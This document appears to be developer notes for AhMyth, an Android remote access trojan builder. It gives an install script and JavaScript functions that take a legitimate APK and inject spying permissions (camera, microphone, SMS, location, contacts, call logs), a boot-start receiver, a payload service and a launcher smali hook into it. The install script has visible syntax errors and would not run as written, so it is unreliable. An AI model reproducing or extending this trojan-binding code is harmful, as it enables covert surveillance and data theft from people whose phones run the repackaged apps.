## New Autoinstall code.
> Thank you to karma0x309 for the base of this code
```bash
#!/bin/sh

# Check package manager
if [-x "$(command -v apt-get)"]; then
PACKAGE_MANAGER = "apt-get"
elif [-x "$(command -v pacman)"]; then
PACKAGE_MANAGER = "pacman"
else
    echo -e "Unsupported package manager.\nThis script currently supports APT and Pacman-based systems."
exit 1
fi

java_install() {
    echo -e "\nInstalling Java 11...\n"
    if ["$PACKAGE_MANAGER" = "apt-get"]; then
    apt-get install -y openjdk-11-jdk
    update-java-alternatives -s java-11-openjdk-amd64
    update-alternatives --set java /usr/lib/jvm/java-11-openjdk-amd64/jre/bin/java
    update-alternatives --set javac /usr/lib/jvm/java-11-openjdk-amd64/bin/javac
    update-alternatives --set javaws /usr/lib/jvm/java-11-openjdk-amd64/jre/bin/javaws
    elif ["$PACKAGE_MANAGER" = "pacman"]; then
    pacman -Sy jdk11-openjdk
    fi
    echo -e "\nJava 11 has been installed successfully."
    sleep 2
    clear
}

nodejs_install() {
    echo -e "\nInstalling Node.js...\n"
    if ["$PACKAGE_MANAGER" = "apt-get"]; then
    apt-get install -y nodejs
    elif ["$PACKAGE_MANAGER" = "pacman"]; then
    pacman -Sy nodejs
    fi
    echo -e "\nNode.js has been installed successfully."
    sleep 2
    clear
}

npm_install() {
    echo -e "\nInstalling npm...\n"
    if ["$PACKAGE_MANAGER" = "apt-get"]; then
    apt-get install -y npm
    elif ["$PACKAGE_MANAGER" = "pacman"]; then
    pacman -Sy npm
    fi
    echo -e "\nnpm has been installed successfully."
    sleep 2
    clear
}

git_install() {
    echo -e "\nInstalling Git...\n"
    if ["$PACKAGE_MANAGER" = "apt-get"]; then
    apt-get install -y git
    elif ["$PACKAGE_MANAGER" = "pacman"]; then
    pacman -Sy git
    fi
    echo -e "\nGit has been installed successfully."
    sleep 2
    clear
}

electron_install() {
    echo -e "\nInstalling Electron v11.0.0...\n"
    npm i -g electron@11.0.0
    echo -e "\nDone."
    sleep 2
    clear
}

create_system_shortcut() {
    # Create ahmyth file and grant executable permissions
    echo -e "\nCreating ahmyth file and granting executable permissions...\n"
    echo '#!/bin/sh' > ahmyth
    echo 'if [ "$(id -u)" = "0" ]; then' >> ahmyth
    echo '    npx electron ./app --no-sandbox start' >> ahmyth
    echo 'else' >> ahmyth
    echo '    npm start' >> ahmyth
    echo 'fi' >> ahmyth
    chmod +x ahmyth
    echo -e "\nahmyth file has been created and executable permissions have been granted."
    sleep 2
    clear

    # Move ahmyth file to /usr/local/sbin
    echo -e "\nMoving ahmyth file to /usr/local/sbin...\n"
    if [-d "/usr/local/sbin"]; then
    mv ahmyth /usr/local/sbin
    echo -e "\nahmyth file has been moved to /usr/local/sbin."
    else
        echo -e "/usr/local/sbin directory not found! Unable to move ahmyth file."
    fi
    sleep 2
    clear
}

# Check if user is root
if ["$(id -u)" != "0"]; then
echo -e "This script must be run as root!" 1 > &2
exit 1
fi

# Update and upgrade
clear
echo -e "Updating and upgrading...\n"
if ["$PACKAGE_MANAGER" = "apt-get"]; then
apt-get update && apt-get upgrade -y
elif ["$PACKAGE_MANAGER" = "pacman"]; then
pacman -Syu --noconfirm
fi
echo -e "\nUpdate and Upgrade done."
sleep 2
clear

# Check if Java 11 is installed
if ["$PACKAGE_MANAGER" = "apt-get"]; then
if [-z "$(dpkg -l | grep openjdk-11)"]; then
echo -e "Java 11 is not installed!"
java_install
fi
elif ["$PACKAGE_MANAGER" = "pacman"]; then
if ! pacman -Qi jdk11-openjdk >/dev/null 2 > &1; then
echo -e "Java 11 is not installed!"
java_install
fi
fi

# Check if nodejs is installed
if [-z "$(command -v node)"]; then
echo -e "Node.js is not installed!" 1 > &2
nodejs_install
fi

# Check if npm is installed
if [-z "$(command -v npm)"]; then
echo -e "npm is not installed!" 1 > &2
npm_install
fi

# Check if git is installed
if [-z "$(command -v git)"]; then
echo -e "Git is not installed!" 1 > &2
git_install
fi

# Check if electron v11 is installed
if [-z "$(command -v electron)"]; then
echo -e "electron has not been installed by npm!\n" 1 > &2
electron_install
fi

# Check if ahmyth system shortcut exists, create it if not
if [-z "$(command -v ahmyth)"]; then
echo -e "\nahmyth system shortcut doesn't exist. Creating..."
create_system_shortcut
fi

# Check if all dependencies are installed
if [-x "$(command -v electron)"] && [-x "$(command -v node)"] && [-x "$(command -v npm)"] && [-x "$(command -v git)"] && [-f "/usr/local/sbin/ahmyth"]; then
echo -e "\nAll Dependencies are Installed\n"
exit 0
fi
```
## Updated `"copyPermissions"` function w/ updated permissions checkbox code.
```javascript
$appCtrl.copyPermissions = (data, callback) => {
    var checkBoxofCamera = document.getElementById("Permissions1");
    var checkBoxofStorage = document.getElementById("Permissions2");
    var checkBoxofMic = document.getElementById("Permissions3");
    var checkBoxofLocation = document.getElementById("Permissions4");
    var checkBoxofContacts = document.getElementById("Permissions5");
    var checkBoxofSms = document.getElementById("Permissions6");
    var checkBoxofCallsLogs = document.getElementById("Permissions7");

    // default permissions for the payload
    const permissions = CONSTANTS.permissions;

    // Create an array to store the selected permissions
    var selectedPermissions = [];

    // Check each checkbox and add the corresponding permission to the selectedPermissions array
    if (checkBoxofCamera.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
    }
    if (checkBoxofStorage.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
    }
    if (checkBoxofMic.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
    }
    if (checkBoxofLocation.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
    }
    if (checkBoxofContacts.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
    }
    if (checkBoxofSms.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
    }
    if (checkBoxofCallsLogs.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
    }

    // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
    if (
        checkBoxofCamera.checked &&
        checkBoxofStorage.checked &&
        checkBoxofMic.checked &&
        checkBoxofLocation.checked &&
        checkBoxofContacts.checked &&
        checkBoxofSms.checked &&
        checkBoxofCallsLogs.checked
    ) {
        selectedPermissions = permissions;
    }

    // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
    if (
        !checkBoxofCamera.checked &&
        !checkBoxofStorage.checked &&
        !checkBoxofMic.checked &&
        !checkBoxofLocation.checked &&
        !checkBoxofContacts.checked &&
        !checkBoxofSms.checked &&
        !checkBoxofCallsLogs.checked
    ) {
        selectedPermissions = permissions;
    }

    delayedLog('[★] Parsing the Android Manifest XML Data...');

    // Convert data to a string if it's not already a string
    if (typeof data !== 'string') {
        data = data.toString();
    }

    xml2js.parseString(data, {
        explicitArray: false
    }, (err, result) => {
        if (err) {
            callback('[x] Unable to Parse the Android Manifest XML Data!', CONSTANTS.logStatus.FAIL);
            return;
        }

        const manifestObj = result.manifest;

        // Check if receiver and service properties are arrays
        if (!Array.isArray(manifestObj.application.receiver)) {
            manifestObj.application.receiver = manifestObj.application.receiver ? [manifestObj.application.receiver] : [];
        }

        if (!Array.isArray(manifestObj.application.service)) {
            manifestObj.application.service = manifestObj.application.service ? [manifestObj.application.service] : [];
        }

        // store existing permissions
        const existingPermissions = new Set();

        // Check if permissions already exist in the manifest
        if (manifestObj['uses-permission']) {
            if (!Array.isArray(manifestObj['uses-permission'])) {
                manifestObj['uses-permission'] = [manifestObj['uses-permission']];
            }
            manifestObj['uses-permission'].forEach((permission) => {
                existingPermissions.add(permission.$['android:name']);
            });
        } else {
            manifestObj['uses-permission'] = [];
        }

        // Check if features already exist in the manifest
        if (manifestObj['uses-feature']) {
            if (!Array.isArray(manifestObj['uses-feature'])) {
                manifestObj['uses-feature'] = [manifestObj['uses-feature']];
            }
            manifestObj['uses-feature'].forEach((feature) => {
                existingPermissions.add(feature.$['android:name']);
            });
        } else {
            manifestObj['uses-feature'] = [];
        }

        // Filter selected permissions to exclude duplicates
        const filteredPermissions = selectedPermissions.filter((permission, index, self) => {
            return self.indexOf(permission) === index && !existingPermissions.has(permission);
        });

        delayedLog('[★] Injecting AhMyth Payload Permissions...');

        // Add new permissions and features based on filteredPermissions
        filteredPermissions.forEach(permission => {
            if (permission === 'android.hardware.camera') {
                manifestObj['uses-feature'].push({
                    $: {
                        'android:name': 'android.hardware.camera'
                    },
                    _: '' // Add empty string as element text
                });
            }

            if (permission === 'android.hardware.camera.autofocus') {
                manifestObj['uses-feature'].push({
                    $: {
                        'android:name': 'android.hardware.camera.autofocus'
                    },
                    _: '' // Add empty string as element text
                });
            }

            if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                manifestObj['uses-permission'].push({
                    $: {
                        'android:name': permission
                    },
                    _: '' // Add empty string as element text
                });
            }
        });

        delayedLog('[★] Injecting AhMyth Payload Service and Receiver...');

        // Construct the receiver and service tags using constants
        const receiverTag = {
            $: {
                'android:enabled': 'true',
                'android:exported': 'true',
                'android:name': CONSTANTS.ahmythReceiver,
            },
            'intent-filter': {
                action: {
                    $: {
                        'android:name': 'android.intent.action.BOOT_COMPLETED',
                    },
                },
            },
        };

        const serviceTag = {
            $: {
                'android:enabled': 'true',
                'android:exported': 'false',
                'android:name': CONSTANTS.ahmythService,
            },
        };

        // Add the receiver and service tags to the application node
        manifestObj.application.receiver.push(receiverTag);
        manifestObj.application.service.push(serviceTag);

        const builder = new xml2js.Builder({
            renderOpts: {
                pretty: true,
                indent: '    '
            },
            headless: true
        });

        // Modify the parsed object by finding and updating the closing application tag
        const closingAppTag = '</application>';
        const modifiedClosingAppTag = '\n  </application>';
        const xmlString = builder.buildObject(result);
        const modifiedXml = xmlString.replace(closingAppTag, modifiedClosingAppTag);

        // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
        const closingManifestTag = '</manifest>';
        const finalModifiedXml = modifiedXml.replace(closingManifestTag, '</manifest>');

        callback(null, finalModifiedXml);
    });
};
```
## Updated `"BindOnBoot"` function
```javascript
// "Bind On Boot" method
$appCtrl.BindOnBoot = (apkFolder) => {
    const manifestPath = dir.join(apkFolder,
        'AndroidManifest.xml');

    delayedLog('[★] Reading the Android Manifest XML File...')
    fs.readFile(manifestPath,
        'utf8',
        (err, data) => {
            if (err) {
                delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.copyPermissions(data, (err, finalModifiedXml) => {
                if (err) {
                    callback(err);
                    return;
                }

                delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File...');
                fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[x] Unable to Write Payload Injections back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder)
                });

            });
        });
};
```
## Updated `"BindOnLauncher"` function
```javascript
// "Bind On Launch" method
$appCtrl.BindOnLauncher = (apkFolder) => {
    const manifestPath = dir.join(apkFolder,
        'AndroidManifest.xml');

    delayedLog('[★] Reading the Android Manifest XML File...');
    fs.readFile(manifestPath,
        'utf8',
        (error, data) => {
            if (error) {
                delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.copyPermissions(data, (err, finalModifiedManifest) => {
                if (err) {
                    callback(err);
                    return;
                }

                delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File...');
                fs.writeFile(manifestPath, finalModifiedManifest, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[x] Unable to Write Payload Injection back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    delayedLog('[★] Reading the Modified Android Manifest XML File...')
                    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Unable to Read the Modified Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                            return;
                        }

                        delayedLog('[★] Parsing the Modified Android Manifest XML Data...')
                        xml2js.parseString(data, (err, result) => {
                            if (err) {
                                delayedLog('[x] Unable to Parse the Modified Android Manifest XML Data!', CONSTANTS.logStatus.FAIL);
                                WriteErrorLog(err, 'Parsing');
                                return;
                            }

                            delayedLog('[★] Searching the Modified Android Manifest for a Suitable Main Class...');

                            const launcherActivity = GetLauncherActivity(result, apkFolder);
                            if (launcherActivity === -1) {
                                delayedLog('[x] Cannot Locate a Suitable Main Class in the Manifest!', CONSTANTS.logStatus.FAIL);
                                delayedLog('[x] Please use Another APK as a Template!.', CONSTANTS.logStatus.FAIL);
                                return;
                            }

                            delayedLog('[★] Locating the Main Class Smali File...');
                            const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                                if (err) {
                                    delayedLog('[x] Unable to Locate the Main Class Smali File!', CONSTANTS.logStatus.FAIL);
                                    delayedLog('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
                                    return;
                                } else {
                                    delayedLog('[¡] Main Class Smali File Found: ' + launcherPath, CONSTANTS.logStatus.INFO);
                                }

                                delayedLog('[★] Reading the Main Class Smali File...');
                                fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                                    if (error) {
                                        delayedLog('[x] Unable to Read the Main Smali Class File!', CONSTANTS.logStatus.FAIL);
                                        return;
                                    }

                                    const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                                    var hook = CONSTANTS.hookPoint;

                                    delayedLog('[★] Injecting AhMyth Hook into the Main Class Smali File...');

                                    var output = data.replace(hook, startService);
                                    fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                        if (error) {
                                            delayedLog('[x] Unable to Hook the Main Class Smali File!', CONSTANTS.logStatus.FAIL);
                                            return;
                                        }

                                        delayedLog('[★] Reading the Target SDK Version in the Manifest...');
                                        fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                                            if (error) {
                                                delayedLog('[x] Unable to Read the Target SDK Version in the Manifest!', CONSTANTS.logStatus.FAIL);
                                                return;
                                            }

                                            delayedLog('[★] Modifying the Target SDK Version in the Manifest...');

                                            var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                            var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                            var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                            var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;

                                            var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                            .replace(compSdkVerNameRegex, "$111" + '"')
                                            .replace(platVerCoRegex, "$122" + '"')
                                            .replace(platVerNameRegex, "$111" + '"');

                                            fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), repXmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    delayedLog('[x] Unable to Modify the Target SDK in the Manifest!', CONSTANTS.logStatus.FAIL);
                                                    return;
                                                }
                                                delayedLog('[★] Reading the Target SDK Version in the "apktool.yml" File...')
                                                fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                                    if (error) {
                                                        delayedLog('[x] Unable to Read the Target SDK version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                                        return;
                                                    }
                                                    delayedLog('[★] Modifying the Target SDK Version in the "apktool.yml" File...')
                                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                                    var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                                    .replace(tarSdkRegex, "$122'");

                                                    fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                        if (error) {
                                                            delayedLog('[x] Unable to Modify the Target SDK Version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                                            return;
                                                        }
                                                        $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
                                                    });
                                                });
                                            });
                                        });
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
};
```
